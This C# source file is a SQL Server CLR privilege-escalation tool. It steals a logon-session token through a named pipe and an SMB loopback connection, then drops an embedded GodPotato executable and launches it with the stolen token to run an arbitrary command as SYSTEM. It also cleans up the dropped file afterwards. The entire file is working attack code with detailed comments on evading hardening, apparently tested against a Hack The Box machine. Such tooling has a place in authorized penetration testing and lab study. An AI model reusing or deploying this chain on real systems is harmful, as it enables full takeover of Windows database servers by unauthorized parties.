// Token Theft + GodPotato chain for escalation WITHOUT SeImpersonatePrivilege
// (Forshaw 2020 — https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html)
//
// Step 1: Named pipe + SMB loopback -> recover stored logon session token (has SeImpersonate)
// Step 2: Drop the embedded GodPotato exe + launch it as a FRESH PROCESS whose
//         PRIMARY token is the stolen one -> that process's own RPCSS/DCOM
//         coercion runs with an unstripped primary token and reaches SYSTEM,
//         then internally spawns the target command AS SYSTEM.
//
// Why a fresh process instead of running GodPotato in-process (the original
// design): SQL Server's PROCESS token has SeImpersonate stripped by hardening.
// Running GodPotato in-process only IMPERSONATES the stolen token on the
// calling thread — the DCOM activation still resolves against the process
// identity, so the incoming SYSTEM connection is only captured at
// identification level and GetToken() degrades to NT AUTHORITY\NETWORK SERVICE
// (RPCSS), not SYSTEM (confirmed live against HTB DarkZero DC02: in-process
// GodPotato returned NETWORK SERVICE even with SeImpersonate explicitly
// enabled on the impersonation token). A NEW process whose PRIMARY token is
// the stolen one has an unstripped process identity, so its own in-process
// GodPotato run reaches SYSTEM — this exactly mirrors the write-up's
// `New-Win32Process -token $token 'gp.exe -cmd "..."'`.
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using SharpToken;

namespace GodPotato {
public class SqlTokenTheftChain {
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern IntPtr CreateNamedPipe(string n, uint om, uint pm, uint mx, uint ob, uint ib, uint t, IntPtr sa);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool ConnectNamedPipe(IntPtr p, IntPtr o);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern IntPtr CreateFile(string n, uint acc, uint sh, IntPtr sa, uint cd, uint fl, IntPtr t2);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool ReadFile(IntPtr h, byte[] b, uint n, ref uint r, IntPtr o);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool WriteFile(IntPtr h, byte[] b, uint n, ref uint w, IntPtr o);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateNamedPipeClient(IntPtr p);
    [DllImport("advapi32.dll")] static extern bool RevertToSelf();
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool os, ref IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr src, uint a, IntPtr at, int il, int tp, ref IntPtr dup);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateLoggedOnUser(IntPtr t);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern void Sleep(uint ms);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr CreateEvent(IntPtr sa, bool m, bool i, IntPtr n);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool SetEvent(IntPtr h);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, ref uint tid);

    // Name of the manifest resource the embedded godpotato_standalone.exe is
    // baked in under (see Dockerfile.runtime: `mcs ... -resource:...,name`).
    const string EMBEDDED_GP_RESOURCE = "AdscanGodPotato.exe";

    // Log by shelling out through cmd.exe, exactly like the working SqlGodPotato
    // sibling. SQL Server CLR sandboxes direct System.IO.File writes even under
    // PERMISSION_SET=UNSAFE on hardened instances, so File.WriteAllText silently
    // produced an empty log; `cmd /c echo >> file` is proven to work in this
    // exact environment. `path` is the caller-resolved log location — see Run()
    // for why it must be the service account's own %TEMP%, not a fixed path.
    static void L(string path, string msg) {
        try {
            var psi = new System.Diagnostics.ProcessStartInfo(
                "cmd.exe", "/c echo " + msg.Replace(" ", "_") + " >> " + path);
            psi.UseShellExecute = false;
            psi.CreateNoWindow  = true;
            var p = System.Diagnostics.Process.Start(psi);
            if (p != null) p.WaitForExit(3000);
        } catch {}
    }

    delegate uint ThreadProc(IntPtr p);
    static ThreadProc s_sp;
    static volatile IntPtr s_pipe = IntPtr.Zero, s_logonToken = IntPtr.Zero, s_event = IntPtr.Zero;
    static volatile string s_log = "";

    // Extract the GodPotato exe baked into THIS assembly's manifest resources
    // (embedded at build time by Dockerfile.runtime via `mcs -resource:...`)
    // and drop it to `dropPath`. Called BEFORE token theft/impersonation, i.e.
    // as the SQL Server service account's own (unimpersonated) identity, which
    // is why dropPath must be a location that account can already write to.
    static bool DropEmbeddedGodPotato(string dropPath) {
        try {
            var asm = System.Reflection.Assembly.GetExecutingAssembly();
            using (var res = asm.GetManifestResourceStream(EMBEDDED_GP_RESOURCE)) {
                if (res == null) return false;
                var buf = new byte[res.Length];
                int off = 0, n;
                while (off < buf.Length && (n = res.Read(buf, off, buf.Length - off)) > 0) off += n;
                System.IO.File.WriteAllBytes(dropPath, buf);
                return System.IO.File.Exists(dropPath);
            }
        } catch { return false; }
    }

    static uint PipeServerThread(IntPtr _) {
        IntPtr pipe = s_pipe;
        ConnectNamedPipe(pipe, IntPtr.Zero);
        byte[] buf = new byte[4]; uint nr = 0;
        ReadFile(pipe, buf, 4, ref nr, IntPtr.Zero);
        if (ImpersonateNamedPipeClient(pipe)) {
            IntPtr ttok = IntPtr.Zero;
            if (OpenThreadToken(GetCurrentThread(), 0xF01FF, true, ref ttok)) {
                IntPtr dup = IntPtr.Zero;
                if (DuplicateTokenEx(ttok, 0x02000000, IntPtr.Zero, 2, 1, ref dup))
                    s_logonToken = dup;
                CloseHandle(ttok);
            }
            RevertToSelf();
        }
        SetEvent(s_event);
        return 0;
    }

    public static void Run(string cmd) {
        // Debug log MUST live in a directory the SERVICE ACCOUNT can write to.
        // A lab-only path (C:\avlab) doesn't exist on real targets and hardened
        // hosts deny svc accounts write to C:\Windows\Temp — a throwing/denied
        // write here used to silently abort the whole escalation on its FIRST
        // statement. Path.GetTempPath() resolves to the running account's own
        // %TEMP% (e.g. C:\Users\<svc>\AppData\Local\Temp), writable by definition
        // for any service account. The write is also guarded so a denied path can
        // NEVER abort the chain (defense in depth).
        string logPath;
        string dropDir;
        try { dropDir = System.IO.Path.GetTempPath(); }
        catch { dropDir = @"C:\Users\Public\"; }
        logPath = dropDir + "adscan_ttc_log.txt";
        s_log = logPath;
        try {
            L(logPath, "CHAIN_START");

            // Drop the embedded GodPotato exe NOW, while still running as the
            // ambient SQL Server service account (i.e. BEFORE any impersonation
            // below) — that account already owns/writes dropDir, whereas the
            // token we are about to steal has not been proven to.
            string gpPath = dropDir + "adscan_gp_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".exe";
            bool dropped = DropEmbeddedGodPotato(gpPath);
            L(logPath, "GP_DROPPED=" + dropped);
            if (!dropped) return;

            // ── Step 1: Token theft via SMB loopback ──────────────────────
            string id    = Guid.NewGuid().ToString("N").Substring(0, 8);
            string local = @"\\.\pipe\" + id;
            string smb   = @"\\localhost\pipe\" + id;

            IntPtr pipe = CreateNamedPipe(local, 3, 0, 255, 4096, 4096, 0, IntPtr.Zero);
            if (pipe == new IntPtr(-1)) { L(logPath, "PIPE_FAIL"); return; }
            s_pipe  = pipe;
            s_event = CreateEvent(IntPtr.Zero, false, false, IntPtr.Zero);

            s_sp = PipeServerThread; uint tid = 0;
            CreateThread(IntPtr.Zero, 0, Marshal.GetFunctionPointerForDelegate(s_sp), IntPtr.Zero, 0, ref tid);
            Sleep(150);

            // Connect via SMB loopback — kernel uses stored logon session token
            IntPtr client = CreateFile(smb, 0xC0000000u, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
            if (client != new IntPtr(-1)) {
                byte[] ping = new byte[]{ 0x41 }; uint nw = 0;
                WriteFile(client, ping, 1, ref nw, IntPtr.Zero);
                CloseHandle(client);
            }

            WaitForSingleObject(s_event, 10000);
            CloseHandle(pipe); CloseHandle(s_event);
            L(logPath, "LOGON_TOKEN=" + (s_logonToken != IntPtr.Zero));
            if (s_logonToken == IntPtr.Zero) return;
            try { L(logPath, "STOLEN_ID=" + new WindowsIdentity(s_logonToken).Name); }
            catch(Exception ide) { L(logPath, "STOLEN_ID_EX=" + ide.GetType().Name); }

            // The recovered logon-session token HAS SeImpersonatePrivilege but it
            // is DISABLED by default. CreateProcessWithTokenW checks the privilege
            // on the CALLING thread's effective token, so it must be enabled before
            // we impersonate + launch the fresh GodPotato process below.
            bool seimp_enabled = TokenuUils.tryAddTokenPriv(s_logonToken, "SeImpersonatePrivilege");
            L(logPath, "SEIMP_ENABLED=" + seimp_enabled);

            // ── Step 2: Impersonate stored token on this thread ────────────
            // (needed only so the SeImpersonate privilege check below sees it —
            // the actual escalation happens in the FRESH PROCESS spawned next).
            bool imp = ImpersonateLoggedOnUser(s_logonToken);
            L(logPath, "IMP_LOGON=" + imp);
            if (!imp) { CloseHandle(s_logonToken); return; }

            // ── Step 3: Launch GodPotato as a FRESH PROCESS whose PRIMARY ──
            // token is the stolen one (mirrors the write-up's
            // `New-Win32Process -token $token 'gp.exe -cmd "..."'`). That
            // process's own primary token is unstripped, so its in-process
            // RPCSS/DCOM coercion reaches SYSTEM and it internally spawns
            // `cmd` AS SYSTEM (see GodPotato/Program.cs -> createProcessReadOut).
            string escapedCmd = cmd.Replace("\"", "\\\"");
            string gpCmdLine = "\"" + gpPath + "\" -cmd \"" + escapedCmd + "\"";
            var gpOutput = new System.IO.StringWriter();
            try {
                TokenuUils.createProcessReadOut(gpOutput, s_logonToken, gpCmdLine);
            } catch(Exception gex) { L(logPath, "GP_LAUNCH_EX=" + gex.GetType().Name); }

            RevertToSelf(); // back to original (svc_sql) process token
            CloseHandle(s_logonToken);

            // Persist GodPotato's own stdout (has its [*] CurrentUser: ... line
            // proving SYSTEM was reached, plus createProcessReadOut's own
            // "[*] process start with pid N" for the nested `cmd` launch).
            string outText = gpOutput.ToString();
            foreach (var ln in outText.Split('\n')) {
                var trimmed = ln.Trim();
                if (trimmed.Length > 0) L(logPath, "GP_OUT:" + trimmed);
            }
            L(logPath, "DONE");

            // Best-effort cleanup of the dropped exe — back on svc_sql identity,
            // which wrote the file in the first place.
            try { System.IO.File.Delete(gpPath); } catch {}
        } catch(Exception ex) {
            try { L(logPath, "OUTER_EX=" + ex.GetType().Name + ":" + ex.Message.Substring(0, Math.Min(80, ex.Message.Length))); } catch {}
        }
    }
}}
